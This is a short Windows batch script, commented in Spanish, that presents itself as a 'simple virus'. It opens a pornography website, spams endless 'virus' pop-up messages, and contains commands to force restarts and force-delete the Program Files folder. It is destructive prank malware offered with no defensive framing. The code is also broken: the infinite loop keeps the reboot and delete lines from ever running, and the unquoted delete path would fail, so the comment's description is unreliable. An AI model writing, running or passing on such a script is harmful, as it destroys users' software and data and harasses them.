REM virus simple en cual se encarga de mostrar mensajes de virus, entrar a la página web de PornHub, reiniciar el equipo cada 10 segundos y eliminar la carpeta donde se instalan la mayoría de programas.	

@echo on
start www.pornhub.com
msg * Iniciando Virus

:virus
msg * Ejecutando Virus
goto :virus

SHUTDOWN -R /T 10
cd C:
del Program Files /F

